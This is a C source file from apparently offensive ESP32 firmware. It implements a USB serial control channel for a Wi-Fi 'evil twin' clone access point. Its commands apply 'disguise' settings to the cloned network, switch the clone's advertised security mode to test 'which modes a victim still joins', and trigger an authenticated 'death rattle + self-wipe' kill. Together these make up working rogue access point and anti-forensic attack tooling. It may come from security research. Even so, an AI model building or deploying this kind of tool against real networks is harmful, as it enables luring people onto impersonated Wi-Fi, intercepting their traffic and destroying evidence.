#include "serial_control.h"
#include "disguise.h"
#include "wifi_twin.h"
#include "control_server.h"
#include "app_config.h"

#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_log.h"
#include "driver/usb_serial_jtag.h"
#include "esp_vfs_dev.h"

static const char *TAG = "serctl";

static void handle_line(char *line)
{
    if (line[0] == '{') {                       // a disguise JSON patch
        if (disguise_merge_json(line) == ESP_OK) {
            disguise_save();
            wifi_twin_apply_disguise(disguise_current());
            char *j = disguise_to_json();
            printf("DISGUISE_OK %s\n", j ? j : "{}");
            free(j);
        } else {
            printf("DISGUISE_ERR bad_json\n");
        }
    } else if (strncmp(line, "STATUS", 6) == 0) {
        char *j = disguise_to_json();
        printf("STATUS %s\n", j ? j : "{}");
        free(j);
    } else if (strncmp(line, "PING", 4) == 0) {
        printf("PONG\n");
    } else if (strncmp(line, "KILL ", 5) == 0) {
        // Authenticated kill over USB, so the finisher does not depend on the
        // WiFi control plane. "KILL <token>".
        if (strcmp(line + 5, ALGHUL_CONTROL_TOKEN) == 0) {
            printf("KILL_OK death rattle + self-wipe\n");
            control_server_kill();
        } else {
            printf("KILL_ERR bad_token\n");
        }
    } else if (strncmp(line, "AUTHMODE ", 9) == 0) {
        // Security-mode experiment: re-advertise the clone under a chosen mode,
        // so we can measure which modes a victim still joins.
        // "AUTHMODE OPEN|WPA2|WPA2-PMF|WPA3|WPA2WPA3"
        const char *m = line + 9;
        wifi_auth_mode_t mode = WIFI_AUTH_WPA2_PSK;
        bool pmf = false, ok = true;
        if      (strcmp(m, "OPEN") == 0)       mode = WIFI_AUTH_OPEN;
        else if (strcmp(m, "WPA2") == 0)       mode = WIFI_AUTH_WPA2_PSK;
        else if (strcmp(m, "WPA2-PMF") == 0) { mode = WIFI_AUTH_WPA2_PSK; pmf = true; }
        else if (strcmp(m, "WPA3") == 0)       mode = WIFI_AUTH_WPA3_PSK;
        else if (strcmp(m, "WPA2WPA3") == 0)   mode = WIFI_AUTH_WPA2_WPA3_PSK;
        else ok = false;
        if (ok) {
            wifi_twin_set_authmode(mode, pmf);
            printf("AUTHMODE_OK %s\n", wifi_twin_authmode_name());
        } else {
            printf("AUTHMODE_ERR use OPEN|WPA2|WPA2-PMF|WPA3|WPA2WPA3\n");
        }
    }
}

static void serial_task(void *arg)
{
    static char line[600];
    int pos = 0;
    while (1) {
        int c = fgetc(stdin);
        if (c == EOF) {
            vTaskDelay(pdMS_TO_TICKS(20));
            continue;
        }
        if (c == '\n' || c == '\r') {
            if (pos > 0) {
                line[pos] = '\0';
                handle_line(line);
                pos = 0;
            }
        } else if (pos < (int)sizeof(line) - 1) {
            line[pos++] = (char)c;
        }
    }
}

esp_err_t serial_control_start(void)
{
    usb_serial_jtag_driver_config_t ucfg = {
        .tx_buffer_size = 1024,
        .rx_buffer_size = 1024,
    };
    esp_err_t e = usb_serial_jtag_driver_install(&ucfg);
    if (e != ESP_OK) {
        ESP_LOGE(TAG, "usb_serial_jtag install failed: %s", esp_err_to_name(e));
        return e;
    }
    esp_vfs_usb_serial_jtag_use_driver();  // route stdin/stdout through the driver
    xTaskCreate(serial_task, "serctl", 4096, NULL, 5, NULL);
    ESP_LOGI(TAG, "USB serial control ready (send disguise JSON, STATUS, or PING)");
    return ESP_OK;
}
